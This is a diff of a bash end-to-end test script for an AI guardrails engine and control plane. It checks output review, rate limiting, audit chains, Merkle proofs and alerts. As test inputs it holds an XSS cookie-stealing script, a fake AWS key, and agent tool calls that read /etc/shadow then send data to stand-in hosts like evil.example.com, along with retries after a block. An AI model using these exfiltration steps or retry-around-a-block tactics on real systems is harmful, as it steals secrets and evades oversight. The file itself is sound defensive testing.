@@ -1,44 +1,71 @@
 #!/usr/bin/env bash
 # =============================================================================
-# Guardrails E2E (no Kafka) — codifies the A/B/C feature verification.
+# Guardrails full-flow E2E — API-ONLY (no direct SQLite / Redis access).
 #
-# Boots this repo's control + engine on ALTERNATE ports (never touches a running
-# 8080/8082), points the engine at a local mock Ollama, and exercises:
+# Simulates the REAL user operation flow end to end. Every assertion is made
+# through an HTTP API; the script NEVER opens the control SQLite file and NEVER
+# runs sqlite3/redis-cli. Data reaches the control plane the same way it does in
+# production: the engine publishes audit events to Kafka and the control plane
+# ingests them; trace events are produced to Kafka in the MCP-proxy's wire
+# format (the real transport, not a DB poke).
 #
-#   Engine (via HTTP + Redis):
-#     B1/B3/B4  output review via POST /v1/evaluate role=output:
-#               deterministic rules (XSS -> reject, credential -> redact+sanitized),
-#               pipeline verdict (normal -> allow+warn)
-#     B2        streaming-window review (stream_chunk=true) -> disposal
-#     RATE      evaluate rate limiter v2: 30 windows of one trace unthrottled
-#     NOCHAT    /v1/chat/completions is REMOVED from the engine (404)
-#     C1        chain pattern: sensitive read -> external egress (chain-exfil)
-#     C2        retry-escape after a block (retry-escape)
-#   Control (dev SQLite + new schema):
-#     A3  trace-chain verify: valid 2-step chain passes, tampered row breaks at its seq
-#     A3  audit hash-chain verify + daily-anchor seal + chain status
-#     A4  Merkle proof + independent verify (correct root -> true, tampered -> false)
-#     A6  Decision BOM reconstruction (and from an alert)
-#     A7  encrypted export (AES-GCM, no plaintext leak) + export list/404
-#     A8/B7 output-review stats (answer-level aggregation via trace_id)
-#     C4  alerts lifecycle: seed -> list -> get -> ack -> BOM
-#     C5  session checkpoint read path (seeded -> returned)
+#   运营台 (control HTTP API)          engine HTTP API              Kafka
+#   -------------------------          ----------------           ------
+#   create tenant         -----------> (evaluate)  --audit-->     control ingest
+#   output-review-stats   <-------------------------------------+
+#   decision-bom / Merkle / export    (engine output review)     |
+#   alerts list/ack/BOM   <-------------------------------------+
+#   trace-chain / checkpoint / seal   (proxy wire format) --trace--> control
 #
-# Requires: java, curl, python3, sqlite3, a reachable Redis.
-# Kafka is NOT required (engine audit events are queued async, dropped
-# without a broker — stats checks seed the DB directly).
+# Engine coverage (via POST /v1/evaluate — the caller's real flow):
+#   B1/B3/B4  output review matrix: XSS -> deny+reject, credential ->
+#             deny+redact+sanitized_content, normal -> allow+warn
+#   B2        streaming-window review (stream_chunk=true) -> disposal
+#   RATE      evaluate rate limiter v2: 30 windows of one trace unthrottled
+#   NOCHAT    /v1/chat/completions is REMOVED from the engine (404)
+#   role      evaluate role is a closed enum (user -> 400 unsupported_role)
+#   C1        chain pattern: sensitive read -> external egress (chain-exfil)
+#   C2        retry-escape after a block — reproduced with REAL evaluate calls
+#             (a deny+full prior_signal blocks call 1; two changed retries +
+#             the current call trip retry-escape). The old version LPUSHed a
+#             synthetic tool_history via redis-cli; the detector now sees the
+#             exact history the engine itself records from real calls.
 #
-# Known gaps (need a Kafka broker + run-local.sh, not runnable here):
-#   - audit/trace ingest -> auto alert generation, session checkpoint writes,
-#     audit hash-chain / Merkle chaining, retention archive job.
+# Control coverage (via 运营台 admin APIs, data via real Kafka ingest):
+#   A8/B7 output-review stats: answer-level aggregation of the real engine
+#         output-review events (XSS/credential/window denies)
+#   A6    Decision BOM reconstruction from a real ingested event (event_id
+#         drives the Merkle proof — no seeded event ids)
+#   A4    Merkle proof + independent verify (correct root+proof -> true,
+#         tampered root -> false)
+#   A7    encrypted export (AES-GCM, no plaintext leak) + export list/404
+#   A3    audit hash-chain verify + daily-anchor seal + read-back + chain status
+#   A3    per-session trace-chain verify: valid 2-step chain (Kafka, proxy
+#         wire format) passes; tenant-level verify flags nothing broken
+#   C4    alerts lifecycle: auto-created from the deny audit event -> list ->
+#         get -> ack -> BOM -> 404
+#   C5    session checkpoint read path (written from ingested trace events)
+#
+# Known gaps / dropped checks (deliberate, with reason):
+#   - sqlite ".tables" schema check: no API lists tables; every new table is
+#     instead exercised functionally (stats/BOM/merkle/export/alerts/checkpoint/
+#     trace-chain/daily-anchor seal).
+#   - tampered trace-chain row: not producible through any real flow —
+#     TraceEventIngestor recomputes curr_hash at ingest and no API mutates
+#     tb_agent_trace. The verifier's tamper/gap/unchained branches are covered
+#     by TraceChainVerifierTest (unit level) instead.
 #   - engine C0 chainAnomaly delta from an L3 Groovy rule (needs a rule store).
 #   - MCP-proxy STI (B6) — Rust binary, separate harness.
 #   - SDK streaming wrap_stream end-to-end — covered by
 #     virbius-review-sdk tests + schemas/review-window-vectors.json.
 #
-# Usage:        bash scripts/test-guardrails-e2e.sh
-# Skip build:   SKIP_BUILD=1 bash scripts/test-guardrails-e2e.sh
-# Custom ports: CONTROL_PORT=18080 ENGINE_PORT=18082 MOCK_PORT=18999
+# Requires: java, curl, python3, nc, docker (kafka console producer), a
+# reachable Redis and Kafka. Kafka may be started via docker-compose.infra.yml.
+#
+# Usage:            bash scripts/test-guardrails-e2e.sh
+# Skip build:       SKIP_BUILD=1 bash scripts/test-guardrails-e2e.sh
+# Custom ports:     CONTROL_PORT=18080 ENGINE_PORT=18082 MOCK_PORT=18999
+# Keep logs:        KEEP_WORK=1 bash scripts/test-guardrails-e2e.sh
 # =============================================================================
 set -euo pipefail
 
@@ -49,6 +76,14 @@ CONTROL_PORT="${CONTROL_PORT:-18080}"
 ENGINE_PORT="${ENGINE_PORT:-18082}"
 MOCK_PORT="${MOCK_PORT:-18999}"
 REDIS_URL="${VIRBIUS_REDIS_URL:-redis://127.0.0.1:6379}"
+REDIS_HOST="${REDIS_HOST:-127.0.0.1}"; REDIS_PORT="${REDIS_PORT:-6379}"
+KAFKA_HOST="${KAFKA_HOST:-127.0.0.1}"; KAFKA_PORT="${KAFKA_PORT:-9092}"
+AUDIT_TOPIC="virbius-audit-events"
+TRACE_TOPIC="virbius-trace-events"
+# The day whose (chained) trace rows the daily-anchor seal is asked to seal.
+# Trace events are produced with occurred_at on this day, so the seal has
+# real leaves to Merkle-anchor.
+ANCHOR_DATE="${ANCHOR_DATE:-2026-10-14}"
 
 WORK="$(mktemp -d "${TMPDIR:-/tmp}/virbius-e2e.XXXXXX")"
 LOGS="$WORK/logs"; DATA="$WORK/data"
@@ -59,6 +94,7 @@ green(){ printf '\033[0;32m%s\033[0m\n' "$*"; }
 red(){ printf '\033[0;31m%s\033[0m\n' "$*"; }
 info(){ printf '\033[0;36m[INFO]\033[0m %s\n' "$*"; }
 check(){ if [ "$1" = "1" ]; then PASS=$((PASS+1)); green "  PASS  $2"; else FAIL=$((FAIL+1)); red "  FAIL  $2"; fi; }
+jget(){ python3 -c "import sys,json;d=json.load(sys.stdin);$1" "${2:-}" 2>/dev/null || echo "PARSE_ERROR"; }
 
 cleanup() {
   info "shutting down..."
@@ -67,18 +103,41 @@ cleanup() {
   [ -n "${MOCK_PID:-}" ] && kill "$MOCK_PID" 2>/dev/null || true
   pkill -f "$WORK/mock_ollama.py" 2>/dev/null || true
   wait 2>/dev/null || true
-  rm -rf "$WORK"
+  if [ "${KEEP_WORK:-0}" = "1" ]; then
+    info "KEEP_WORK=1: logs at $WORK"
+  else
+    rm -rf "$WORK"
+  fi
 }
 trap cleanup EXIT INT TERM
 
 # ── preconditions ────────────────────────────────────────────────────────────
-for bin in java curl python3 sqlite3; do
+for bin in java curl python3 nc docker; do
   command -v "$bin" >/dev/null 2>&1 || { red "missing required tool: $bin"; exit 2; }
 done
-if ! redis-cli -u "$REDIS_URL" ping 2>/dev/null | grep -q PONG; then
-  red "Redis not reachable at $REDIS_URL (required by engine). Start redis-server or set VIRBIUS_REDIS_URL."
-  exit 2
+nc -z "$REDIS_HOST" "$REDIS_PORT" 2>/dev/null \
+  || { red "Redis not reachable at $REDIS_HOST:$REDIS_PORT (engine requires it)."; exit 2; }
+if ! nc -z "$KAFKA_HOST" "$KAFKA_PORT" 2>/dev/null; then
+  info "Kafka not on $KAFKA_HOST:$KAFKA_PORT — starting via docker-compose.infra.yml..."
+  docker compose -p virbius-infra -f "$ROOT/docker-compose.infra.yml" up -d --wait kafka >/dev/null 2>&1 || true
+  for _ in $(seq 1 30); do nc -z "$KAFKA_HOST" "$KAFKA_PORT" 2>/dev/null && break; sleep 1; done
+  nc -z "$KAFKA_HOST" "$KAFKA_PORT" 2>/dev/null \
+    || { red "Kafka not reachable (needed for the engine->control audit path)."; exit 2; }
 fi
+# Pre-create the audit/trace topics. Without this the control consumer subscribes
+# to a topic that does not exist yet (auto-created only when the engine first
+# publishes) and partition assignment is delayed ~1min — events published during
+# the run would not be ingested until the test is over. Best-effort.
+KAFKA_CID="$(docker ps --format '{{.Names}}' | grep -m1 kafka || true)"
+if [ -n "$KAFKA_CID" ]; then
+  for t in "$AUDIT_TOPIC" "$TRACE_TOPIC"; do
+    docker exec "$KAFKA_CID" /opt/kafka/bin/kafka-topics.sh \
+      --bootstrap-server localhost:9092 --create --if-not-exists \
+      --topic "$t" --partitions 3 --replication-factor 1 >/dev/null 2>&1 || true
+  done
+  info "Kafka topics ensured ($AUDIT_TOPIC, $TRACE_TOPIC)"
+fi
+
 APP_VER="$(grep -m1 '<version>' "$ROOT/pom.xml" | sed 's/.*<version>\(.*\)<\/version>.*/\1/')"
 ENGINE_JAR="$ROOT/virbius-engine/target/virbius-engine-${APP_VER}.jar"
 CONTROL_JAR="$ROOT/virbius-control/target/virbius-control-${APP_VER}.jar"
@@ -149,8 +208,11 @@ info "starting engine on :$ENGINE_PORT..."
 env VIRBIUS_DATA_DIR="$DATA" VIRBIUS_REDIS_URL="$REDIS_URL" \
     VIRBIUS_LICENSE_MASTER_KEY="$VIRBIUS_LICENSE_MASTER_KEY" \
     VIRBIUS_PROMPT_LLM_BASE_URL="http://127.0.0.1:$MOCK_PORT" \
+    KAFKA_BOOTSTRAP_SERVERS="$KAFKA_HOST:$KAFKA_PORT" \
     SPRING_PROFILES_ACTIVE=dev \
     java -jar "$ENGINE_JAR" --server.port="$ENGINE_PORT" \
+      --virbius.evaluate.auth.enabled=false \
+      --virbius.evaluate.auth.bootstrap-pem-file= \
     > "$LOGS/engine.log" 2>&1 &
 ENGINE_PID=$!
 
@@ -158,6 +220,7 @@ info "starting control on :$CONTROL_PORT..."
 env VIRBIUS_DATA_DIR="$DATA" VIRBIUS_REDIS_URL="$REDIS_URL" \
     VIRBIUS_LICENSE_MASTER_KEY="$VIRBIUS_LICENSE_MASTER_KEY" \
     VIRBIUS_DELEGATED_MASTER_KEY="$VIRBIUS_DELEGATED_MASTER_KEY" \
+    KAFKA_BOOTSTRAP_SERVERS="$KAFKA_HOST:$KAFKA_PORT" \
     SPRING_PROFILES_ACTIVE=dev \
     java -jar "$CONTROL_JAR" --server.port="$CONTROL_PORT" \
       --virbius.audit.export.key="$EXPORT_KEY" \
@@ -169,7 +232,7 @@ wait_http "http://127.0.0.1:$CONTROL_PORT/api/v1/health" || { red "control faile
 info "services up."
 
 E="http://127.0.0.1:$ENGINE_PORT"
-C="http://127.0.0.1:$CONTROL_PORT/api/v1/admin/tenants/default"
+C="http://127.0.0.1:$CONTROL_PORT"
 
 # Output review is exposed via POST /v1/evaluate with role=output: the engine
 # returns disposal_action (+ sanitized_content for redact) and the caller
@@ -177,202 +240,306 @@ C="http://127.0.0.1:$CONTROL_PORT/api/v1/admin/tenants/default"
 # stream_chunk=true (the official SDK wraps this; its windowing is covered by
 # the shared vectors in schemas/review-window-vectors.json).
 evout(){ curl -s --max-time 20 -X POST "$E/v1/evaluate" -H 'Content-Type: application/json' -d "$1"; }
+evtool(){ curl -s --max-time 15 -X POST "$E/v1/evaluate" -H 'Content-Type: application/json' --data-binary "@$1"; }
 
+T="gr-t$$-$(date +%s)"
+info "functional tenant=$T"
+
+# ── Phase 1: 运营台 bootstrap (control API) ─────────────────────────────────
+info "E2E: 运营台 create tenant (real operator flow)"
+R=$(curl -s -X POST "$C/api/v1/admin/tenants" -H 'Content-Type: application/json' \
+      -d "{\"tenant_id\":\"$T\",\"name\":\"guardrails e2e\"}")
+check "$(printf '%s' "$R" | jget 'print("1" if d.get("data",{}).get("tenant_id")=="'"$T"'" or d.get("code")==200 else "0")')" \
+      "create tenant $T via API"
+
+AC="$C/api/v1/admin/tenants/$T"
+
+# ── Phase 2: engine caller flow (deterministic output rules) ────────────────
 info "E2E: engine output review via evaluate API (B1/B3/B4)"
-R=$(evout '{"tenant_id":"default","role":"output","tool_name":"chat_completion","session_id":"s-out-1","trace_id":"tr-out-1","content":"Sure! Here is the snippet: <script>alert(document.cookie)</script>"}')
-V=$(printf '%s' "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("1" if d.get("disposal_action")=="reject" and d.get("effective_action")=="deny" else "0")' 2>/dev/null || echo 0)
-[ "${E2E_DEBUG:-0}" = "1" ] && printf 'DBG R1=%s\n' "${R:0:220}" >&2
-check "$V" "malicious output -> deny + disposal reject"
+R=$(evout "{\"tenant_id\":\"$T\",\"role\":\"output\",\"tool_name\":\"chat_completion\",\"session_id\":\"s-out-1\",\"trace_id\":\"tr-out-1\",\"content\":\"Sure! Here is the snippet: <script>alert(document.cookie)</script>\"}")
+check "$(printf '%s' "$R" | jget 'print("1" if d.get("disposal_action")=="reject" and d.get("effective_action")=="deny" else "0")')" \
+      "malicious output -> deny + disposal reject"
 
-R=$(evout '{"tenant_id":"default","role":"output","tool_name":"chat_completion","session_id":"s-out-2","trace_id":"tr-out-2","content":"leaked key AKIAABCDEFGHIJKLMNOP and mail a@b.com"}')
-V=$(printf '%s' "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("1" if d.get("disposal_action")=="redact" and "[REDACTED_AWS_KEY]" in (d.get("sanitized_content") or "") and "[REDACTED_EMAIL]" in (d.get("sanitized_content") or "") else "0")' 2>/dev/null || echo 0)
-check "$V" "credential leak -> disposal redact + sanitized_content"
+R=$(evout "{\"tenant_id\":\"$T\",\"role\":\"output\",\"tool_name\":\"chat_completion\",\"session_id\":\"s-out-2\",\"trace_id\":\"tr-out-2\",\"content\":\"leaked key AKIAABCDEFGHIJKLMNOP and mail a@b.com\"}")
+check "$(printf '%s' "$R" | jget 'print("1" if d.get("disposal_action")=="redact" and "[REDACTED_AWS_KEY]" in (d.get("sanitized_content") or "") and "[REDACTED_EMAIL]" in (d.get("sanitized_content") or "") else "0")')" \
+      "credential leak -> disposal redact + sanitized_content"
 
-R=$(evout '{"tenant_id":"default","role":"output","tool_name":"chat_completion","session_id":"s-out-3","trace_id":"tr-out-3","content":"The weather today is sunny and warm."}')
-V=$(printf '%s' "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("1" if d.get("disposal_action")=="warn" and d.get("effective_action")=="allow" else "0")' 2>/dev/null || echo 0)
-check "$V" "normal output -> allow + disposal warn"
+R=$(evout "{\"tenant_id\":\"$T\",\"role\":\"output\",\"tool_name\":\"chat_completion\",\"session_id\":\"s-out-3\",\"trace_id\":\"tr-out-3\",\"content\":\"The weather today is sunny and warm.\"}")
+check "$(printf '%s' "$R" | jget 'print("1" if d.get("disposal_action")=="warn" and d.get("effective_action")=="allow" else "0")')" \
+      "normal output -> allow + disposal warn"
 
 info "E2E: engine streaming-window output review (B2, stream_chunk=true)"
-R=$(evout '{"tenant_id":"default","role":"output","tool_name":"chat_completion","session_id":"s-out-4","trace_id":"tr-out-4","stream_chunk":true,"content":"partial window <script>alert(1)</script>"}')
-V=$(printf '%s' "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("1" if d.get("disposal_action") in ("reject","omit") else "0")' 2>/dev/null || echo 0)
-check "$V" "stream window malicious -> disposal reject/omit"
+R=$(evout "{\"tenant_id\":\"$T\",\"role\":\"output\",\"tool_name\":\"chat_completion\",\"session_id\":\"s-out-4\",\"trace_id\":\"tr-out-4\",\"stream_chunk\":true,\"content\":\"partial window <script>alert(1)</script>\"}")
+check "$(printf '%s' "$R" | jget 'print("1" if d.get("disposal_action") in ("reject","omit") else "0")')" \
+      "stream window malicious -> disposal reject/omit"
 
 info "E2E: chat endpoint removed from the engine"
 V=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 -X POST "$E/v1/chat/completions" -H 'Content-Type: application/json' -d '{"model":"m","messages":[]}')
-check "$([ "$V" = "404" ] || [ "$V" = "405" ] && echo 1 || echo 0)" "POST /v1/chat/completions on the engine -> 404/405 (endpoint removed)"
+check "$([ "$V" = "404" ] || [ "$V" = "405" ] && echo 1 || echo 0)" \
+      "POST /v1/chat/completions on the engine -> 404/405 (endpoint removed)"
 
 info "E2E: evaluate role is a closed enum"
-V=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 -X POST "$E/v1/evaluate" -H 'Content-Type: application/json' -d '{"tenant_id":"default","role":"user","tool_name":"chat_input","content":"hi"}')
+V=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 -X POST "$E/v1/evaluate" -H 'Content-Type: application/json' \
+    -d "{\"tenant_id\":\"$T\",\"role\":\"user\",\"tool_name\":\"chat_input\",\"content\":\"hi\"}")
 check "$([ "$V" = "400" ] && echo 1 || echo 0)" "role=user (legacy) -> 400 unsupported_role"
 
 info "E2E: evaluate rate limit does not throttle streaming windows (v2)"
 V=1
 for i in $(seq 1 30); do
-  evout "{\"tenant_id\":\"default\",\"role\":\"output\",\"tool_name\":\"chat_completion\",\"session_id\":\"s-rl\",\"trace_id\":\"tr-rl\",\"stream_chunk\":true,\"content\":\"window $i\"}" \
+  evout "{\"tenant_id\":\"$T\",\"role\":\"output\",\"tool_name\":\"chat_completion\",\"session_id\":\"s-rl\",\"trace_id\":\"tr-rl\",\"stream_chunk\":true,\"content\":\"window $i\"}" \
     | grep -q '"rate_limited"' && V=0
 done
 check "$V" "30 windows of one trace pass the rate limiter"
 
 info "E2E: chain pattern detection (C1)"
 SESS_C="e2e-c1-$$"
-curl -s --max-time 15 -X POST "$E/v1/evaluate" -H 'Content-Type: application/json' \
-  -d "{\"tenant_id\":\"default\",\"role\":\"tool_call\",\"session_id\":\"$SESS_C\",\"tool_name\":\"read_file\",\"args_json\":\"{\\\"path\\\":\\\"/etc/shadow\\\"}\",\"license_risk_quota\":100}" >/dev/null
-R=$(curl -s --max-time 15 -X POST "$E/v1/evaluate" -H 'Content-Type: application/json' \
-  -d "{\"tenant_id\":\"default\",\"role\":\"tool_call\",\"session_id\":\"$SESS_C\",\"tool_name\":\"curl\",\"args_json\":\"{\\\"url\\\":\\\"http://evil.example.com/collect\\\"}\",\"license_risk_quota\":100}")
-V=$(printf '%s' "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("1" if d.get("rule_id")=="chain-exfil" else "0")' 2>/dev/null || echo 0)
-check "$V" "read /etc/shadow -> external curl => chain-exfil"
+cat > "$WORK/c1_1.json" <<JSON
+{"tenant_id":"$T","role":"tool_call","session_id":"$SESS_C","tool_name":"read_file","args_json":"{\\"path\\":\\"/etc/shadow\\"}","license_risk_quota":100}
+JSON
+evtool "$WORK/c1_1.json" >/dev/null
+cat > "$WORK/c1_2.json" <<JSON
+{"tenant_id":"$T","role":"tool_call","session_id":"$SESS_C","tool_name":"curl","args_json":"{\\"url\\":\\"http://evil.example.com/collect\\"}","license_risk_quota":100}
+JSON
+R=$(evtool "$WORK/c1_2.json")
+check "$(printf '%s' "$R" | jget 'print("1" if d.get("rule_id")=="chain-exfil" else "0")')" \
+      "read /etc/shadow -> external curl => chain-exfil"
 
-info "E2E: retry-escape detection (C2)"
+info "E2E: retry-escape detection (C2) via real evaluate calls"
+# The old version LPUSHed a synthetic tool_history via redis-cli (a direct DB
+# write). Here the block is created the real way — call 1 carries a deny+full
+# prior_signal, so the engine blocks it and records allowed=false in the
+# session tool history it keeps in Redis. Two changed retries then the current
+# call complete the retry-escape pattern (block + >=3 attempts after, with a
+# changed tool/args, no 3-call washout).
 SESS_R="e2e-c2-$$"
-K="session:${SESS_R}:tool_history"
-printf '%s' '{"tool_name":"read_file","args":"{\"path\":\"/etc/shadow\"}","allowed":false,"ts":1}' > "$WORK/h1"
-printf '%s' '{"tool_name":"http_get","args":"{\"url\":\"http://evil/a\"}","allowed":true,"ts":2}'  > "$WORK/h2"
-printf '%s' '{"tool_name":"curl","args":"{\"url\":\"http://evil/b\"}","allowed":true,"ts":3}'      > "$WORK/h3"
-redis-cli -u "$REDIS_URL" DEL "$K" >/dev/null
-redis-cli -u "$REDIS_URL" LPUSH "$K" "$(cat "$WORK/h1")" >/dev/null
-redis-cli -u "$REDIS_URL" LPUSH "$K" "$(cat "$WORK/h2")" >/dev/null
-redis-cli -u "$REDIS_URL" LPUSH "$K" "$(cat "$WORK/h3")" >/dev/null
-R=$(curl -s --max-time 15 -X POST "$E/v1/evaluate" -H 'Content-Type: application/json' \
-  -d "{\"tenant_id\":\"default\",\"role\":\"tool_call\",\"session_id\":\"$SESS_R\",\"tool_name\":\"fetch\",\"args_json\":\"{\\\"url\\\":\\\"http://evil/c\\\"}\",\"license_risk_quota\":100}")
-V=$(printf '%s' "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("1" if d.get("rule_id")=="retry-escape" else "0")' 2>/dev/null || echo 0)
-check "$V" "block + 2 changed retries + current => retry-escape"
+cat > "$WORK/c2_1.json" <<JSON
+{"tenant_id":"$T","role":"tool_call","session_id":"$SESS_R","tool_name":"read_file","args_json":"{\\"path\\":\\"/etc/shadow\\"}","license_risk_quota":100,"prior_signals":[{"rule_id":"e2e-prior-deny","rule_revision":1,"source":"cloud","layer":"cloud","score":90,"reason_code":"E2E_PRIOR_DENY","intent_action":"deny","enforce_mode":"full"}]}
+JSON
+R=$(evtool "$WORK/c2_1.json")
+check "$(printf '%s' "$R" | jget 'print("1" if d.get("effective_action")=="block" else "0")')" \
+      "deny+full prior_signal -> block (recorded allowed=false in tool history)"
+cat > "$WORK/c2_2.json" <<JSON
+{"tenant_id":"$T","role":"tool_call","session_id":"$SESS_R","tool_name":"python3","args_json":"{\\"code\\":\\"print(1)\\"}","license_risk_quota":100}
+JSON
+evtool "$WORK/c2_2.json" >/dev/null
+cat > "$WORK/c2_3.json" <<JSON
+{"tenant_id":"$T","role":"tool_call","session_id":"$SESS_R","tool_name":"curl","args_json":"{\\"url\\":\\"http://evil.example/b\\"}","license_risk_quota":100}
+JSON
+evtool "$WORK/c2_3.json" >/dev/null
+cat > "$WORK/c2_4.json" <<JSON
+{"tenant_id":"$T","role":"tool_call","session_id":"$SESS_R","tool_name":"fetch","args_json":"{\\"url\\":\\"http://evil.example/c\\"}","license_risk_quota":100}
+JSON
+R=$(evtool "$WORK/c2_4.json")
+[ "${E2E_DEBUG:-0}" = "1" ] && printf 'DBG C2-4=%s\n' "${R:0:220}" >&2
+check "$(printf '%s' "$R" | jget 'print("1" if d.get("rule_id")=="retry-escape" else "0")')" \
+      "block + 2 changed retries + current => retry-escape"
 
-# ── control scenarios ────────────────────────────────────────────────────────
-info "E2E: control new schema present"
-DB="$DATA/virbius-control.db"
-TABLES=$(sqlite3 "$DB" ".tables" 2>/dev/null)
-MISSING=""
-for t in tb_alert tb_trace_chain_state tb_audit_daily_anchor tb_tenant_retention_policy tb_audit_export_job tb_session_checkpoint tb_audit_events_archive tb_agent_trace_archive; do
-  printf '%s' "$TABLES" | grep -qw "$t" || MISSING="$MISSING $t"
+# ── Phase 3: 运营台 observation via the real Kafka ingest ───────────────────
+info "E2E: output-review stats (A8/B7) via real Kafka ingest"
+# The engine-phase output reviews above publish deny events (XSS / credential /
+# window) to Kafka; the control plane ingests them. Poll until a denied answer
+# shows up, then assert the answer-level aggregation.
+STATS=""; GOT=0
+for _ in $(seq 1 45); do
+  STATS=$(curl -s "$AC/audit/output-review-stats")
+  GOT=$(printf '%s' "$STATS" | jget 'print(1 if d.get("data",{}).get("denied",0) >= 1 else 0)')
+  [ "$GOT" = "1" ] && break
+  sleep 1
 done
-check "$([ -z "$MISSING" ] && echo 1 || echo 0)" "new tables created by dev schema${MISSING:+ (missing:$MISSING)}"
+check "$GOT" "output-review stats aggregate >=1 denied answer via Kafka ingest (no DB seeding)"
+check "$(printf '%s' "$STATS" | jget 'print("1" if d.get("data",{}).get("window_events",0) >= 1 else "0")')" \
+      "window_events >= 1 (raw deny events counted)"
+check "$(printf '%s' "$STATS" | jget 'print("1" if (d.get("data",{}).get("deny_rate") or 0) > 0 else "0")')" \
+      "deny_rate > 0"
+check "$(printf '%s' "$STATS" | jget 'print("1" if d.get("data",{}).get("scene")=="output" else "0")')" \
+      "stats scoped to the output scene"
 
-info "E2E: seed one output audit event"
-HASH="sha256:$(openssl rand -hex 32 2>/dev/null || python3 -c 'import os;print(os.urandom(32).hex())')"
-sqlite3 "$DB" "INSERT INTO tb_audit_events (event_id,trace_id,tenant_id,scene,layer,rule_id,rule_revision,reason_code,effective_action,max_risk_score,rollout_state,intercepted_at,audit_seq,prev_hash,curr_hash) VALUES ('evt-e2e-1','tr-e2e-1','default','output','cloud','OUTPUT_XSS',1,'OUTPUT_XSS','deny',90,'full','2026-10-14T00:12:00Z',1,'sha256:0000000000000000000000000000000000000000000000000000000000000000','$HASH');"
+info "E2E: decision BOM (A6) reconstructs the real XSS deny event"
+BOM=""; EID=""; BOM_OK=0
+for _ in $(seq 1 45); do
+  BOM=$(curl -s "$AC/audit/decision-bom/tr-out-1")
+  EID=$(printf '%s' "$BOM" | jget 'print(d.get("data",{}).get("audit_events",[{}])[0].get("event_id",""))')
+  [ -n "$EID" ] && [ "$EID" != "PARSE_ERROR" ] && { BOM_OK=1; break; }
+  sleep 1
+done
+check "$BOM_OK" "decision BOM reconstructs >=1 audit event for the XSS trace"
+[ "${E2E_DEBUG:-0}" = "1" ] && printf 'DBG BOM=%s\n' "$(printf '%s' "$BOM" | head -c 400)" >&2
+check "$(printf '%s' "$BOM" | jget 'print("1" if len(d.get("data",{}).get("audit_events",[]))>=1 and d.get("data",{}).get("audit_events",[{}])[0].get("effective_action")=="deny" else "0")')" \
+      "BOM audit event carries the deny decision"
 
-info "E2E: output-review stats (A8/B7)"
-V=$(curl -s "$C/audit/output-review-stats" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if d["denied"]>=1 and d["deny_rate"]>0 else "0")' 2>/dev/null || echo 0)
-check "$V" "output-review stats aggregates deny rate"
-
-info "E2E: decision BOM (A6)"
-V=$(curl -s "$C/audit/decision-bom/tr-e2e-1" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if len(d["audit_events"])>=1 else "0")' 2>/dev/null || echo 0)
-check "$V" "decision BOM reconstructs audit events"
-
-info "E2E: Merkle proof + verify (A4)"
-ROOT=$(curl -s "$C/audit/proof/evt-e2e-1" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print(d["root_hash"] if d.get("found") and d.get("verified") else "")' 2>/dev/null || echo "")
+info "E2E: Merkle proof + independent verify (A4)"
+curl -s "$AC/audit/proof/$EID" > "$WORK/proof.json"
+ROOT=$(python3 -c 'import json,sys;d=json.load(open(sys.argv[1]))["data"];print(d["root_hash"] if d.get("found") and d.get("verified") else "")' "$WORK/proof.json" 2>/dev/null || echo "")
 check "$([ -n "$ROOT" ] && echo 1 || echo 0)" "Merkle proof found + self-verified"
-V=$(curl -s -X POST "$C/audit/verify-proof" -H 'Content-Type: application/json' -d "{\"event_id\":\"evt-e2e-1\",\"root_hash\":\"$ROOT\",\"proof\":[]}" | python3 -c 'import sys,json;print("1" if json.load(sys.stdin)["data"]["verified"] else "0")' 2>/dev/null || echo 0)
-check "$V" "verify-proof (correct root) -> true"
-V=$(curl -s -X POST "$C/audit/verify-proof" -H 'Content-Type: application/json' -d "{\"event_id\":\"evt-e2e-1\",\"root_hash\":\"sha256:deadbeef\",\"proof\":[]}" | python3 -c 'import sys,json;print("1" if not json.load(sys.stdin)["data"]["verified"] else "0")' 2>/dev/null || echo 0)
+# verify-proof re-loads the leaf hash and folds the auditor-supplied steps —
+# so the real proof (root + steps) must verify, and a tampered root must not.
+python3 -c 'import json,sys;print(json.dumps(json.load(open(sys.argv[1]))["data"].get("proof") or []))' "$WORK/proof.json" > "$WORK/steps.json"
+V=$(curl -s -X POST "$AC/audit/verify-proof" -H 'Content-Type: application/json' \
+    -d "{\"event_id\":\"$EID\",\"root_hash\":\"$ROOT\",\"proof\":$(cat "$WORK/steps.json")}" \
+    | jget 'print("1" if d["data"]["verified"] else "0")')
+check "$V" "verify-proof (correct root + proof) -> true"
+V=$(curl -s -X POST "$AC/audit/verify-proof" -H 'Content-Type: application/json' \
+    -d "{\"event_id\":\"$EID\",\"root_hash\":\"sha256:deadbeef\",\"proof\":$(cat "$WORK/steps.json")}" \
+    | jget 'print("1" if not d["data"]["verified"] else "0")')
 check "$V" "verify-proof (tampered root) -> false"
 
 info "E2E: encrypted export (A7)"
-JOB=$(curl -s -X POST "$C/audit/export" -H 'Content-Type: application/json' -d '{"min_risk":50}' | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print(d["job_id"] if d["status"]=="done" else "")' 2>/dev/null || echo "")
-check "$([ -n "$JOB" ] && echo 1 || echo 0)" "export job completed"
-if [ -n "$JOB" ]; then
-  curl -s "$C/audit/export/$JOB/file" -o "$WORK/export.bin"
+JOB=$(curl -s -X POST "$AC/audit/export" -H 'Content-Type: application/json' -d '{"min_risk":50}' \
+      | jget 'print(d["data"]["job_id"] if d["data"]["status"]=="done" else "")')
+check "$([ -n "$JOB" ] && [ "$JOB" != "PARSE_ERROR" ] && echo 1 || echo 0)" "export job completed"
+if [ -n "$JOB" ] && [ "$JOB" != "PARSE_ERROR" ]; then
+  FMT=$(curl -s -D "$WORK/export.hdr" -o "$WORK/export.bin" "$AC/audit/export/$JOB/file" -w '%{http_code}')
   SZ=$(wc -c < "$WORK/export.bin" | tr -d ' ')
